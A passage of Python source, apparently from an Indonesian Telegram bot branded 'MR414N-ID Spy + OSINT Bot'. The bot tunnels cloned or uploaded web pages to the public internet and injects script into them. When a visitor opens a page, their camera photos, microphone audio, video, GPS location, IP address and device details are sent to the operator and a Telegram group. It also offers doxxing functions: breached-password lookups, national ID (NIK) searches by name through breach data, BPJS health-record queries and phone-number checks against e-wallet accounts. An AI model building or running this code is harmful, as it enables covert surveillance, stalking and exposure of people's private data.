                r = req_lib.post("https://gojek.com/api/v1/gopay/check-phone", json={"phone": f"+{no62}"}, timeout=10)
                ada = r.status_code == 200 and "success" in r.text.lower()
            elif platform == "Dana":
                r = req_lib.get(f"https://m.dana.id/m/portal/v1/account/check?phone=%2B{no62}", timeout=10)
                ada = r.status_code == 200 and "REGISTERED" in r.text
            elif platform == "ShopeePay":
                r = req_lib.post("https://shopee.co.id/api/v2/user/check_phone_number", json={"phone_number": no_bersih}, timeout=10)
                ada = r.status_code == 200 and "phone_registered" in r.text.lower()
            elif platform == "LinkAja":
                r = req_lib.get(f"https://api.linkaja.id/v1/user/check?msisdn={no_bersih}", timeout=10)
                ada = r.status_code == 200 and "registered" in r.text.lower()
            else:
                ada = False
        except Exception:
            ada = False
        hasil[platform] = {"ada": ada}
    return hasil, nomor

def scrape_github(username):
    try:
        r = req_lib.get(f"https://api.github.com/users/{username}", timeout=10)
        if r and r.status_code == 200:
            d = r.json()
            return {"nama": d.get("name"), "email": d.get("email"),
                    "lokasi": d.get("location"), "bio": d.get("bio"),
                    "avatar": d.get("avatar_url")}
    except Exception:
        pass
    return {}

def osint_google_dork(username):
    base = "https://html.duckduckgo.com/html/?q="
    queries = [f'"{username}" site:pastebin.com', f'"{username}" filetype:pdf',
               f'"{username}" site:github.com', f'"{username}" email',
               f'"{username}" site:kaskus.co.id', f'"@{username}"']
    hasil = []
    for q in queries:
        try:
            r = req_lib.get(base + req_lib.utils.quote(q),
                            headers={"User-Agent": random.choice(UA_LIST)}, timeout=12)
            if not r: continue
            links = re.findall(r'href="(https?://[^"]+)"', r.text)
            links = [l for l in links if "duckduckgo" not in l][:2]
            for l in links:
                hasil.append({"query": q, "link": l})
            time.sleep(1.0)
        except Exception:
            pass
    return hasil

def osint_wayback(username, found_sites):
    sites = parse_sites(); hasil = []
    for site in found_sites[:8]:
        if site not in sites: continue
        url = sites[site].replace("{u}", username)
        try:
            r = req_lib.get(f"https://archive.org/wayback/available?url={url}",
                            headers={"User-Agent": random.choice(UA_LIST)}, timeout=12)
            if not r: continue
            snap = r.json().get("archived_snapshots", {}).get("closest", {})
            if snap.get("available"):
                hasil.append({"site": site, "tahun": snap.get("timestamp","")[:4], "url": snap.get("url","")})
        except Exception:
            pass
    return hasil

def osint_nik_search(nama, kota=""):
    kandidat = []
    try:
        r = req_lib.get(
            "https://breachdirectory.p.rapidapi.com/",
            headers={"X-RapidAPI-Key": RAPIDAPI_KEY, "X-RapidAPI-Host": "breachdirectory.p.rapidapi.com"},
            params={"func": "auto", "term": nama}, timeout=15)
        if r.status_code == 200:
            for item in r.json().get("result", []):
                nik = item.get("nik") or item.get("id_number","")
                alamat = item.get("alamat") or item.get("address","")
                if not nik: continue
                if kota and kota.lower() not in alamat.lower(): continue
                kandidat.append({"nik": nik, "nama": item.get("nama") or item.get("name",""),
                                  "tgl": item.get("tanggal_lahir") or item.get("dob",""),
                                  "alamat": alamat, "jk": item.get("jenis_kelamin") or item.get("gender","")})
    except Exception:
        pass
    return kandidat

def osint_bpjs(nik, tgl_lahir):
    tgl_fmt = tgl_lahir.strip()
    for fmt in ["%d-%m-%Y","%d/%m/%Y","%Y/%m/%d","%d %m %Y","%Y%m%d"]:
        try:
            from datetime import datetime
            tgl_fmt = datetime.strptime(tgl_lahir.strip(), fmt).strftime("%Y-%m-%d"); break
        except Exception:
            pass
    link = f"https://pasti.bpjs-kesehatan.go.id/cek/?nik={nik}&tgl={tgl_fmt}"
    hasil = {}
    try:
        r = req_lib.post(
            "https://pasti.bpjs-kesehatan.go.id/cek/",
            data={"nik": nik, "tanggal_lahir": tgl_fmt},
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://pasti.bpjs-kesehatan.go.id/cek/",
                     "Origin": "https://pasti.bpjs-kesehatan.go.id"}, timeout=15)
        if r and r.status_code == 200:
            body = r.text
            for label, pattern in [
                ("nama",    r'(?:Nama|name)[^:]*:\s*([^\n<,]+)'),
                ("status",  r'(?:Status|status)[^:]*:\s*([^\n<,]+)'),
                ("kelas",   r'(?:Kelas|kelas)[^:]*:\s*([^\n<,]+)'),
                ("no_bpjs", r'(?:No[^:]*BPJS|nomor)[^:]*:\s*([^\n<,]+)'),
            ]:
                m = re.search(pattern, body, re.IGNORECASE)
                if m: hasil[label] = m.group(1).strip()
    except Exception:
        pass
    return hasil, link

# ================================================================== #
#  DEVICE PARSER
# ================================================================== #
def parse_device(ua):
    ua = ua or ""
    brand, model = "Unknown", "Unknown"
    brand_patterns = [
        (r"SM-([A-Z0-9]+)", "Samsung", r"SM-[A-Z0-9]+"),
        (r"Redmi ([^\s;)]+)", "Xiaomi Redmi", r"Redmi [^\s;)]+"),
        (r"POCO ([^\s;)]+)", "Xiaomi POCO", r"POCO [^\s;)]+"),
        (r"CPH([0-9]+)", "OPPO", r"CPH[0-9]+"),
        (r"RMX([0-9]+)", "Realme", r"RMX[0-9]+"),
        (r"Pixel ([^\s;)]+)", "Google Pixel", r"Pixel [^\s;)]+"),
    ]
    for pattern, b, full_pat in brand_patterns:
        m = re.search(pattern, ua)
        if m:
            brand = b
            mf = re.search(full_pat, ua)
            model = mf.group(0) if mf else m.group(0)
            break
    if "iPhone" in ua: brand = "Apple"; model = "iPhone"
    elif "iPad" in ua: brand = "Apple"; model = "iPad"
    if "Android" in ua:
        m = re.search(r"Android ([0-9.]+)", ua)
        os_ver = "Android " + (m.group(1) if m else "?")
    elif "iPhone OS" in ua or "CPU OS" in ua:
        m = re.search(r"OS ([0-9_]+)", ua)
        os_ver = "iOS " + (m.group(1).replace("_",".") if m else "?")
    elif "Windows NT" in ua:
        nt = {"10.0":"10/11","6.3":"8.1","6.1":"7"}
        m = re.search(r"Windows NT ([0-9.]+)", ua)
        os_ver = "Windows " + nt.get(m.group(1) if m else "","?")
    else:
        os_ver = "Unknown OS"
    if "CriOS" in ua: br = "Chrome iOS"
    elif "Chrome" in ua and "Edg" not in ua: br = "Chrome"
    elif "Firefox" in ua: br = "Firefox"
    elif "Safari" in ua and "Chrome" not in ua: br = "Safari"
    else: br = "Unknown"
    dev_type = "Mobile" if any(x in ua for x in ["Mobile","Android","iPhone","iPad"]) else "Desktop"
    return brand, model, os_ver, br, dev_type

# ================================================================== #
#  KIRIM HASIL KE TELEGRAM
# ================================================================== #
def send_result_thread(data, link_id, owner_uid):
    asyncio.run(_send_result(data, link_id, owner_uid))

async def _send_result(data, link_id, owner_uid):
    bot = Bot(token=BOT_TOKEN)
    num = data.get("num","?"); lat = data.get("lat"); lon = data.get("lon")
    acc = data.get("acc"); front = data.get("photo_front"); back = data.get("photo_back")
    info = data.get("info") or {}; ts = datetime.datetime.now().strftime("%H:%M:%S")
    _cap_counts[link_id] = _cap_counts.get(link_id, 0) + 1
    total = _cap_counts[link_id]; db_increment_cap(owner_uid)
    if total == 1:
        await bot.send_message(chat_id=owner_uid,
            text=f"🎯 *Target masuk!* — Link #{link_id}\n⏰ {ts}", parse_mode="Markdown")
    brand, model, os_ver, br, dev_type = parse_device(info.get("userAgent",""))
    net = info.get("network") or {}; batt = info.get("battery_pct"); chrg = info.get("charging")
    batt_str = f"{batt}% {'🔌' if chrg else '🔋'}" if batt is not None else "?"
    neff = net.get("effectiveType","?"); ndl = net.get("downlink","?")
    teks  = f"📸 *Capture #{num}* (Link #{link_id}) — {ts}\n"
    teks += f"📊 Total: {total}\n\n"
    if lat and lon:
        maps = f"https://maps.google.com/?q={lat},{lon}"
        teks += f"📍 `{lat}, {lon}` ± {int(float(acc))}m\n[Buka Maps]({maps})\n\n"
    else:
        teks += "📍 Lokasi tidak didapat\n\n"
    teks += f"📱 *Merek:* {brand}\n📲 *Model:* {model}\n💻 *Tipe:* {dev_type}\n"
    teks += f"🖥 *OS:* {os_ver}\n🌐 *Browser:* {br}\n"
    teks += f"🔌 *IP:* `{info.get('ip','?')}`\n📡 *Net:* {neff} · {ndl} Mbps\n"
    teks += f"🔋 *Battery:* {batt_str}\n🕐 *TZ:* {info.get('timezone','?')}"
    for dest in [owner_uid, GROUP_ID]:
        try:
            await bot.send_message(chat_id=dest, text=teks, parse_mode="Markdown")
            if num == 1 and lat and lon:
                await bot.send_location(chat_id=dest, latitude=float(lat), longitude=float(lon))
            if back:
                await bot.send_photo(chat_id=dest, photo=base64.b64decode(back),
                                     caption=f"📷 Belakang — Link #{link_id} Cap #{num}")
            if front:
                await bot.send_photo(chat_id=dest, photo=base64.b64decode(front),
                                     caption=f"🤳 Depan — Link #{link_id} Cap #{num}")
        except Exception as e:
            print(f"\n[!] kirim ke {dest}: {e}")

async def _send_audio(b64, link_id, owner_uid):
    bot = Bot(token=BOT_TOKEN); ts = datetime.datetime.now().strftime("%H:%M:%S")
    try:
        audio_bytes = base64.b64decode(b64)
        for dest in [owner_uid, GROUP_ID]:
            try:
                await bot.send_audio(chat_id=dest, audio=audio_bytes,
                    caption=f"🎤 Audio — Link #{link_id} | {ts}",
                    filename=f"audio_{link_id}.webm")
            except Exception as e:
                print(f"\n[!] send audio ke {dest}: {e}")
    except Exception as e:
        print(f"\n[!] decode audio: {e}")

async def _send_video(b64, mime, link_id, owner_uid):
    bot = Bot(token=BOT_TOKEN); ts = datetime.datetime.now().strftime("%H:%M:%S")
    ext = "mp4" if "mp4" in mime else "webm"
    try:
        video_bytes = base64.b64decode(b64)
        for dest in [owner_uid, GROUP_ID]:
            try:
                await bot.send_video(chat_id=dest, video=video_bytes,
                    caption=f"🎥 Video — Link #{link_id} | {ts}",
                    filename=f"video_{link_id}.{ext}", supports_streaming=True)
            except Exception:
                try:
                    await bot.send_document(chat_id=dest, document=video_bytes,
                        caption=f"🎥 Video — Link #{link_id}", filename=f"video_{link_id}.{ext}")
                except Exception as e2:
                    print(f"\n[!] send video: {e2}")
    except Exception as e:
        print(f"\n[!] decode video: {e}")

async def _send_offline(link_id, owner_uid):
    bot = Bot(token=BOT_TOKEN)
    total = _cap_counts.get(link_id, 0)
    await bot.send_message(chat_id=owner_uid,
        text=f"🔴 *Target offline* (Link #{link_id})\nTotal capture: {total}", parse_mode="Markdown")
    # ================================================================== #
#  FLASK
# ================================================================== #
def make_flask_app(link_id, owner_uid):
    fapp = Flask(f"app_{link_id}")

    @fapp.route("/")
    def index(): return _page_htmls.get(link_id, "<h1>Not found</h1>")

    @fapp.route("/capture", methods=["POST"])
    def capture():
        data = freq.get_json(silent=True) or {}
        mark_active(link_id, freq.remote_addr)
        threading.Thread(target=send_result_thread, args=(data, link_id, owner_uid), daemon=True).start()
        return jsonify({"ok": True})

    @fapp.route("/ping", methods=["POST"])
    def ping():
        mark_active(link_id, freq.remote_addr); return jsonify({"ok": True})

    @fapp.route("/video", methods=["POST"])
    def video():
        raw = freq.get_data()
        try:
            data = json.loads(raw); b64 = data.get("video",""); mime = data.get("mime","video/webm")
            if b64:
                threading.Thread(target=lambda: asyncio.run(_send_video(b64, mime, link_id, owner_uid)), daemon=True).start()
        except Exception as e:
            print(f"\n[!] video parse: {e}")
        return jsonify({"ok": True})

    @fapp.route("/audio", methods=["POST"])
    def audio():
        raw = freq.get_data()
        try:
            data = json.loads(raw); b64 = data.get("audio","")
            if b64:
                threading.Thread(target=lambda: asyncio.run(_send_audio(b64, link_id, owner_uid)), daemon=True).start()
        except Exception as e:
            print(f"\n[!] audio parse: {e}")
        return jsonify({"ok": True})

    @fapp.route("/offline", methods=["POST"])
    def offline():
        asyncio.run(_send_offline(link_id, owner_uid)); return jsonify({"ok": True})

    return fapp

def run_flask_on_port(fapp, port):
    fapp.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ================================================================== #
#  TUNNEL
# ================================================================== #
def start_cloudflared(port):
    b = shutil.which("cloudflared")
    if not b: return None, None
    proc = subprocess.Popen([b,"tunnel","--url",f"http://localhost:{port}"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    pat = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
    for _ in range(40):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0), proc
    proc.terminate(); return None, None

_UA = "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"

async def try_shorten(long_url, alias):
    def _spoo():
        r = req_lib.post("https://spoo.me/", data={"url": long_url, "alias": alias},
                         headers={"User-Agent": _UA, "Accept": "application/json"}, timeout=10)
        j = r.json(); s = j.get("short_url") or j.get("url","")
        return s if s.startswith("http") else ""
    def _tinyurl():
        r = req_lib.get("https://tinyurl.com/api-create.php", params={"url": long_url, "alias": alias},
                        headers={"User-Agent": _UA}, timeout=10)
        t = r.text.strip(); return t if t.startswith("http") and "tinyurl" in t else ""
    loop = asyncio.get_event_loop()
    for fn in [_spoo, _tinyurl]:
        try:
            result = await loop.run_in_executor(None, fn)
            if result: return result
        except Exception:
            pass
    return long_url

async def spawn_link(tunnel_key, raw_html, owner_uid, query, mode="cam"):
    global _link_id_ctr
    _link_id_ctr += 1; lid = _link_id_ctr
    port = free_port(8080 + lid * 10)
    _page_htmls[lid] = inject_html(raw_html, mode)
    _cap_counts[lid] = 0
    await query.edit_message_text(f"⏳ Membuat link #{lid}...")
    fapp = make_flask_app(lid, owner_uid)
    threading.Thread(target=run_flask_on_port, args=(fapp, port), daemon=True).start()
    time.sleep(1.0)
    loop = asyncio.get_event_loop()
    pub_url, proc = await loop.run_in_executor(None, start_cloudflared, port)
    if not pub_url:
        await query.edit_message_text("❌ Tunnel gagal.", reply_markup=kb_main(owner_uid)); return
    _links.append({"id": lid, "owner": owner_uid, "pub_url": pub_url, "port": port, "proc": proc, "mode": mode})
    _last_add[owner_uid] = time.time()
    _user_data[owner_uid]["pending_link_id"] = lid
    _user_data[owner_uid]["pending_pub_url"] = pub_url
    await query.edit_message_text(
        f"✅ *Tunnel aktif!*\n\n🔗 `{pub_url}`\n\nMau custom link?",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ Iya", callback_data="custom_yes"),
            InlineKeyboardButton("❌ Tidak", callback_data="custom_no"),
        ]])
    )

def inject_html(html, mode="cam"):
    js = INJECT_JS_MIC if mode == "mic" else (INJECT_JS_VIDEO if mode == "video" else INJECT_JS)
    idx = html.lower().rfind("</body>")
    return (html[:idx] + js + html[idx:]) if idx != -1 else html + js

def free_port(start=8080):
    p = start
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1", p)) != 0: return p
            p += 1

def clone_url(url):
    h = {"User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"}
    r = req_lib.get(url, headers=h, timeout=15); r.raise_for_status(); return r.text

# ================================================================== #
#  KEYBOARD
# ================================================================== #
def kb_reply(uid):
    role = db_get_role(uid)
    rows = [
        [KeyboardButton("➕ Tambah Link"),    KeyboardButton("📋 Daftar Link")],
        [KeyboardButton("🗑 Hapus Link"),     KeyboardButton("📖 Tutorial")],
        [KeyboardButton("🔍 OSINT Tools")],
    ]
    if role == "admin":
        rows.append([KeyboardButton("👑 Panel Admin")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True, is_persistent=True)

def kb_main(uid):
    role = db_get_role(uid)
    rows = [
        [InlineKeyboardButton("➕ Tambah Link",    callback_data="add_link"),
         InlineKeyboardButton("🗑 Hapus Link",     callback_data="del_link")],
        [InlineKeyboardButton("📋 Daftar Link",    callback_data="list_links"),
         InlineKeyboardButton("👁 Target Online",   callback_data="online_now")],
        [InlineKeyboardButton("🔍 OSINT Tools",    callback_data="osint_menu"),
         InlineKeyboardButton("📖 Tutorial",       callback_data="tutorial")],
        [InlineKeyboardButton("🔄 Refresh",        callback_data="refresh_panel")],
    ]
    if role == "admin":
        rows.append([InlineKeyboardButton("👑 Panel Admin", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)

def kb_osint():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👤 Username Finder",  callback_data="o_username"),
         InlineKeyboardButton("🔓 Breach Check",     callback_data="o_breach")],
        [InlineKeyboardButton("💧 Cek Data Bocor",   callback_data="o_bocor")],
        [InlineKeyboardButton("📱 Phone Lookup",     callback_data="o_phone"),
         InlineKeyboardButton("🧑 Profile Scraper",  callback_data="o_profile")],
        [InlineKeyboardButton("🌐 Google Dorking",   callback_data="o_dork"),
         InlineKeyboardButton("🕰 Wayback Check",    callback_data="o_wayback")],
        [InlineKeyboardButton("🪪 NIK Search",       callback_data="o_nik"),
         InlineKeyboardButton("🏥 BPJS Search",      callback_data="o_bpjs")],
        [InlineKeyboardButton("🕵️ Full OSINT",       callback_data="o_full")],
        [InlineKeyboardButton("« Kembali",           callback_data="back_main")],
    ])

def kb_template():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Clone URL",       callback_data="tmpl_url"),
         InlineKeyboardButton("📄 Kirim File HTML", callback_data="tmpl_html")],
        [InlineKeyboardButton("« Kembali", callback_data="back_main")],
    ])

def kb_mode():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 Kamera + Lokasi",         callback_data="mode_cam")],
        [InlineKeyboardButton("🎤 Kamera + Lokasi + Mic",   callback_data="mode_mic")],
        [InlineKeyboardButton("🎥 Video + Lokasi",          callback_data="mode_video")],
        [InlineKeyboardButton("« Kembali", callback_data="back_main")],
    ])

def kb_del(uid):
    rows = []
    for lnk in _links:
        if str(lnk["owner"]) == uid:
            cap = _cap_counts.get(lnk["id"], 0)
            rows.append([InlineKeyboardButton(
                f"🗑 Link #{lnk['id']} ({cap} cap)",
                callback_data=f"delid_{lnk['id']}")])
    rows.append([InlineKeyboardButton("« Kembali", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)

def kb_admin():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬆️ Upgrade User",    callback_data="a_upgrade"),
         InlineKeyboardButton("⬇️ Downgrade User",  callback_data="a_downgrade")],
        [InlineKeyboardButton("🚫 Ban User",         callback_data="a_ban"),
         InlineKeyboardButton("✅ Unban User",        callback_data="a_unban")],
        [InlineKeyboardButton("➕ Tambah Admin",     callback_data="a_addadmin"),
         InlineKeyboardButton("➖ Hapus Admin",      callback_data="a_deladmin")],
        [InlineKeyboardButton("👥 Semua User",       callback_data="a_users"),
         InlineKeyboardButton("📊 Statistik",        callback_data="a_stats")],
        [InlineKeyboardButton("🔗 Semua Link Aktif", callback_data="a_alllinks"),
         InlineKeyboardButton("❌ Force Hapus Link", callback_data="a_forcelink")],
        [InlineKeyboardButton("💬 Pesan ke User",    callback_data="a_msg"),
         InlineKeyboardButton("📢 Broadcast",        callback_data="a_broadcast")],
        [InlineKeyboardButton("🛑 Stop Server",      callback_data="a_stop"),
         InlineKeyboardButton("« Kembali",           callback_data="back_main")],
    ])

# ================================================================== #
#  OSINT BACKGROUND RUNNERS
# ================================================================== #
def run_osint_username(uid, username, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text=f"⏳ Mencari `{username}` di 100+ situs...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        sukses = await loop.run_in_executor(None, osint_username_find, username)
        if not sukses:
            await bot.send_message(chat_id=uid, text="❌ Tidak ada akun ditemukan.")
            return
        teks = f"👤 *Username Finder — {username}*\n\n"
        teks += f"✅ Ditemukan di *{len(sukses)} situs*:\n\n"
        chunk = ""
        for nama, link in sukses:
            line = f"• [{nama}]({link})\n"
            if len(chunk) + len(line) > 3800:
                await bot.send_message(chat_id=uid, text=teks + chunk, parse_mode="Markdown",
                                       disable_web_page_preview=True)
                teks = ""; chunk = ""
            chunk += line
        if chunk:
            await bot.send_message(chat_id=uid, text=teks + chunk, parse_mode="Markdown",
                                   disable_web_page_preview=True)
    asyncio.run(_run())

def run_osint_breach(uid, email, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text=f"⏳ Cek breach untuk `{email}`...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        hasil = await loop.run_in_executor(None, osint_breach_check, email)
        if not hasil:
            await bot.send_message(chat_id=uid, text="✅ Tidak ada breach ditemukan untuk email tersebut.")
            return
        teks = f"🔓 *Breach Check — {email}*\n\n"
        teks += f"⚠️ Ditemukan di *{len(hasil)} breach*:\n\n"
        for b in hasil:
            teks += f"🔸 *{b['nama']}*" + (f" ({b['tahun']})" if b['tahun'] else "") + "\n"
            teks += f"   Data: {b['data']}\n"
            if b.get("password"):
                teks += f"   Password: `{b['password']}`\n"
            teks += "\n"
        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown")
    asyncio.run(_run())

def run_osint_phone(uid, nomor, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text=f"⏳ Lookup nomor `{nomor}`...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        hasil, nomor_fmt = await loop.run_in_executor(None, osint_phone_lookup, nomor)
        teks = f"📱 *Phone Lookup — {nomor_fmt}*\n\n"
        for platform, info in hasil.items():
            icon = "✅" if info["ada"] else "❌"
            teks += f"{icon} {platform}\n"
        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown")
    asyncio.run(_run())

def run_osint_profile(uid, username, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text=f"⏳ Scraping profile `{username}`...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        data = await loop.run_in_executor(None, scrape_github, username)
        if not data:
            await bot.send_message(chat_id=uid, text="❌ Tidak ada data profile ditemukan.")
            return
        teks = f"🧑 *Profile Scraper — {username}*\n\n"
        for k, v in data.items():
            if v and k != "avatar":
                teks += f"*{k}:* {v}\n"
        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown")
        if data.get("avatar"):
            try:
                await bot.send_photo(chat_id=uid, photo=data["avatar"], caption=f"Avatar — {username}")
            except Exception:
                pass
    asyncio.run(_run())

def run_osint_dork(uid, username, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text=f"⏳ Dorking `{username}`...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        hasil = await loop.run_in_executor(None, osint_google_dork, username)
        if not hasil:
            await bot.send_message(chat_id=uid, text="❌ Tidak ada hasil dork.")
            return
        teks = f"🌐 *Google Dorking — {username}*\n\n"
        for d in hasil[:15]:
            teks += f"🔎 `{d['query']}`\n→ {d['link']}\n\n"
        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown", disable_web_page_preview=True)
    asyncio.run(_run())

def run_osint_wayback(uid, username, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text=f"⏳ Wayback check `{username}`...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        found = await loop.run_in_executor(None, osint_username_find, username)
        found_sites = [s for s, _ in found[:8]]
        hasil = await loop.run_in_executor(None, osint_wayback, username, found_sites)
        if not hasil:
            await bot.send_message(chat_id=uid, text="❌ Tidak ada arsip ditemukan.")
            return
        teks = f"🕰 *Wayback Check — {username}*\n\n"
        for w in hasil:
            teks += f"📁 *{w['site']}* ({w['tahun']})\n{w['url']}\n\n"
        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown", disable_web_page_preview=True)
    asyncio.run(_run())

def run_osint_nik(uid, nama, kota, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text=f"⏳ Mencari NIK untuk `{nama}`...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        kandidat = await loop.run_in_executor(None, osint_nik_search, nama, kota)
        if not kandidat:
            await bot.send_message(chat_id=uid, text="❌ Tidak ada NIK ditemukan.")
            return
        teks = f"🪪 *NIK Search — {nama}*\n\n"
        for i, k in enumerate(kandidat[:10], 1):
            teks += f"*[{i}]* NIK: `{k['nik']}`\n"
            teks += f"Nama: {k['nama']}\nTTL: {k['tgl']}\nAlamat: {k['alamat']}\nJK: {k['jk']}\n\n"
        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown")
    asyncio.run(_run())

def run_osint_bpjs(uid, nik, tgl, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text=f"⏳ BPJS check NIK `{nik}`...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        hasil, link = await loop.run_in_executor(None, osint_bpjs, nik, tgl)
        if hasil:
            teks = f"🏥 *BPJS Search*\n\n"
            for k, v in hasil.items():
                teks += f"*{k}:* {v}\n"
        else:
            teks = f"🏥 *BPJS Search*\n\nEndpoint terblokir captcha.\nBuka link ini:\n{link}"
        await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown", disable_web_page_preview=True)
    asyncio.run(_run())

def run_osint_full(uid, username, email, nomor, bot_token):
    async def _run():
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=uid, text="⏳ Full OSINT dimulai...", parse_mode="Markdown")
        loop = asyncio.get_event_loop()
        laporan = ""
        if username:
            await bot.send_message(chat_id=uid, text=f"[1/4] 👤 Username Finder: `{username}`", parse_mode="Markdown")
            sukses = await loop.run_in_executor(None, osint_username_find, username)
            laporan += f"👤 Username: {len(sukses)} platform\n"
            if sukses:
                teks = f"👤 *{username}* ditemukan di:\n"
                for n, l in sukses[:20]:
                    teks += f"• [{n}]({l})\n"
                await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown", disable_web_page_preview=True)
        if email:
            await bot.send_message(chat_id=uid, text=f"[2/4] 🔓 Breach Check: `{email}`", parse_mode="Markdown")
            hasil_b = await loop.run_in_executor(None, osint_breach_check, email)
            laporan += f"🔓 Breach: {len(hasil_b)} ditemukan\n"
            if hasil_b:
                teks = f"🔓 Breach *{email}*:\n"
                for b in hasil_b:
                    teks += f"• {b['nama']} ({b['tahun']}) — {b['data']}\n"
                await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown")
        if nomor:
            await bot.send_message(chat_id=uid, text=f"[3/4] 📱 Phone Lookup: `{nomor}`", parse_mode="Markdown")
            hasil_p, nomor_fmt = await loop.run_in_executor(None, osint_phone_lookup, nomor)
            laporan += f"📱 Phone: {nomor_fmt}\n"
            teks = f"📱 Phone *{nomor_fmt}*:\n"
            for p, info in hasil_p.items():
                teks += f"{'✅' if info['ada'] else '❌'} {p}\n"
            await bot.send_message(chat_id=uid, text=teks, parse_mode="Markdown")
        await bot.send_message(chat_id=uid,
            text=f"✅ *Full OSINT Selesai*\n\n{laporan}", parse_mode="Markdown")
    asyncio.run(_run())
    # ================================================================== #
#  HANDLERS — /start
# ================================================================== #
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if db_is_banned(uid):
        await update.message.reply_text("🚫 Kamu telah dibanned dari bot ini."); return
    is_new = db_ensure_user(uid); role = db_get_role(uid)
    cap = db_read()["users"].get(uid, {}).get("cap_total", 0)
    badge = {"admin": "👑 Admin", "premium": "💎 Premium", "free": "🆓 Free"}.get(role, "🆓 Free")
    if is_new and role != "admin":
        for a_id in db_read().get("admins", []):
            try:
                await context.bot.send_message(chat_id=a_id,
                    text=f"🆕 *User baru!*\nID: `{uid}`\nWaktu: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
                    parse_mode="Markdown")
            except: pass
    teks  = f"🕵️ *MR414N-ID Spy + OSINT Bot*\n\n"
    teks += f"Status: {badge}\nTotal capture: {cap}\n\nPanel kontrol:"
    _user_state[uid] = None; _user_data[uid] = {}
    await update.message.reply_text("⌨️", reply_markup=kb_reply(uid))
    await update.message.reply_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))

# ================================================================== #
#  HANDLERS — CALLBACK
# ================================================================== #
async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; uid = str(q.message.chat_id); d = q.data
    await q.answer()
    if db_is_banned(uid):
        await q.answer("🚫 Kamu telah dibanned.", show_alert=True); return
    role = db_get_role(uid)

    # --- back ---
    if d == "back_main":
        _user_state[uid] = None; _user_data[uid] = {}
        cap = db_read()["users"].get(uid, {}).get("cap_total", 0)
        badge = {"admin": "👑 Admin", "premium": "💎 Premium", "free": "🆓 Free"}.get(role, "🆓 Free")
        await q.edit_message_text(
            f"🕵️ *MR414N-ID Spy + OSINT Bot*\n\nStatus: {badge}\nTotal capture: {cap}\n\nPanel kontrol:",
            parse_mode="Markdown", reply_markup=kb_main(uid))

    elif d == "tutorial":
        await q.edit_message_text(TUTORIAL_TEXT, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Kembali", callback_data="back_main")]]))

    elif d == "refresh_panel":
        cap = db_read()["users"].get(uid, {}).get("cap_total", 0)
        badge = {"admin": "👑 Admin", "premium": "💎 Premium", "free": "🆓 Free"}.get(role, "🆓 Free")
        aktif = db_link_count(uid)
        teks  = f"🕵️ *MR414N-ID Spy + OSINT Bot*\n\nStatus: {badge}\nTotal capture: {cap}\n"
        teks += f"Link aktif: {aktif}" + (f"/{FREE_LIMIT}" if role == "free" else "") + "\n"
        teks += f"⏰ {datetime.datetime.now().strftime('%H:%M:%S')}\n\nPanel kontrol:"
        await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))

    # ============================================================
    #  OSINT MENU
    # ============================================================
    elif d == "osint_menu":
        await q.edit_message_text(
            "🔍 *OSINT Tools — MR414N-ID*\n\nPilih fitur:",
            parse_mode="Markdown", reply_markup=kb_osint())

    elif d == "o_username":
        _user_state[uid] = "osint_username"
        await q.edit_message_text("👤 *Username Finder*\n\nKetik username yang mau dicari:", parse_mode="Markdown")

    elif d == "o_breach":
